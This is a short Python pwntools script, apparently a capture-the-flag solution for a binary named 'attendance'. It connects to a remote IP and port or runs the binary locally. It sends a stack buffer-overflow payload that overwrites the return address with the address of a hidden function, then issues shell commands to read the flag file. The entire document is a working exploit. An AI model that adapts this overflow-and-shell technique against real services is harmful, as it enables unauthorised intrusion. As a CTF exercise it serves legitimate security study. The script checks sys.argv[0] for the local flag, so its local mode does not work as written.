#!/usr/bin/python

# (C) 2018 Gordon Engelke <reject@email.de>

import sys
from pwn import *

#context.log_level = 'debug'

if sys.argv[0] == "local":
  local = True
else:
  local = False

if not local:
  io = remote( "89.38.210.128", 31337 )
else:
  context.binary = './attendance'
  io = process( "./attendance" )

return_address = p32( 0x08048660 )  # address of bring_student_to_school()
payload = "A" * 16 + "B" * 16 + "C" * 16 + return_address

print( io.recv() )
log.info( "Sending student ID 31337" )
io.sendline( "31337" )
log.info( "Sending principal message (payload): " + payload )
io.sendline( payload )
io.sendline( "cd /home/attendance" )
io.sendline( "cat flag" )
print( io.recv() )
print( io.recv() )
